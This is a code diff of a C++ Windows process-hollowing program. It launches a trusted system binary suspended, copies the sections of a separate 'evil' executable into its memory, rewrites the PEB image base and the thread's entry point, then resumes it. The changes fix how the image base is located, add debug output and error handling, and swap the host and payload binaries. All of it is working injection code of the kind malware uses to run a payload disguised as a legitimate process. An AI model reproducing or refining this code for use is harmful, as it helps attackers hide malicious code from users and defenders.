@@ -22,10 +22,9 @@ typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(
     PVOID BaseAddress
     );
 
-
 int main()
 {
-    const char* filename = "C:\\Windows\\System32\\notepad.exe";
+    const char* filename = "C:\\Windows\\System32\\tasklist.exe";
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
@@ -33,7 +32,7 @@ int main()
     ZeroMemory(&pi, sizeof(pi));
 
     // Shellcode
-    const char* evilfilename = "C:\\Windows\\System32\\calc.exe";
+    const char* evilfilename = "C:\\Windows\\System32\\cmd.exe";
     HANDLE hFile = CreateFileA(evilfilename, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);
     if (!hFile) {
         std::cerr << "[x] Error: " << std::endl;
@@ -82,7 +81,7 @@ int main()
         FreeLibrary(hNTDLL);
         return FALSE;
     }
-    std::cerr << "[+] Successfuly opened process . " << std::endl;
+    std::cerr << "[+] Successfuly opened process . "  << std::endl;
 
     PROCESS_BASIC_INFORMATION pbi = { 0 };
     DWORD dwReturnLength = 0;
@@ -107,10 +106,10 @@ int main()
     }
     std::cout << "[+] Successfully Read process memory. " << std::endl;
 
-    // Read ImageBaseAddress from PEB
+    // Read ImageBaseAddress from the context
     PVOID imageBaseAddress = 0;
-    LPCVOID pebImageBaseOffset = (PBYTE)pbi.PebBaseAddress + 0x10;
-    if (!ReadProcessMemory(hProcess, pebImageBaseOffset, &imageBaseAddress, sizeof(PVOID), NULL)) {
+    DWORD64 pebImageBaseOffset = ctx.Rdx + 0x10; //same as get the PEB section address and add 0x10
+    if (!ReadProcessMemory(hProcess, (LPCVOID)pebImageBaseOffset, &imageBaseAddress, sizeof(PVOID), NULL)) {
         std::cerr << "[x] Error: Unable to read ImageBaseAddress from PEB. Error: " << GetLastError() << std::endl;
         CloseHandle(hProcess);
         return FALSE;
@@ -162,6 +161,7 @@ int main()
         std::cout << "  [INFO] Succcessfuly copied section " << pSectionHeader->Name << std::endl;
     }
     std::cout << "[+]Successfuly copied all evil process sections in target process memory." << std::endl;
+
     // Update ImageBaseAddress in the PEB
     if (!WriteProcessMemory(pi.hProcess, (LPVOID)pebImageBaseOffset, &pRemoteImage, sizeof(PVOID), NULL)) {
         std::cerr << "[x] Error updating PEB: " << GetLastError() << std::endl;
@@ -171,6 +171,10 @@ int main()
     // Set the new entry point in the thread context (RCX for 64-bit)
     DWORD64 newEntryPoint = (DWORD64)((LPBYTE)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
     ctx.Rcx = newEntryPoint;
+    std::cout << "[INFO] pRemoteImage: " << std::hex << pRemoteImage << std::dec << std::endl;
+    std::cout << "[INFO] AddressOfEntryPoint: " << pNtHeaders->OptionalHeader.AddressOfEntryPoint << std::endl;
+    std::cout << "[INFO] newEntryPoint: " << newEntryPoint << std::endl;
+
 
     if (!SetThreadContext(pi.hThread, &ctx)) {
         std::cerr << "[x] Error updating thread context: " << GetLastError() << std::endl;
@@ -178,10 +182,16 @@ int main()
     }
     std::cout << "[+] Successfully updated base address in the PEB & context." << std::endl;
     // Resume thread and wait for process to complete
-    ResumeThread(pi.hThread);
+    DWORD suspendCount = ResumeThread(pi.hThread);
+    if (suspendCount == (DWORD)-1) {
+        std::cerr << "[x] Error resuming thread: " << GetLastError() << std::endl;
+        return FALSE;
+    }
     WaitForSingleObject(pi.hProcess, INFINITE);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
+    FreeLibrary(hNTDLL);
+    delete[] pEvilImage;
 
     return TRUE;
 }
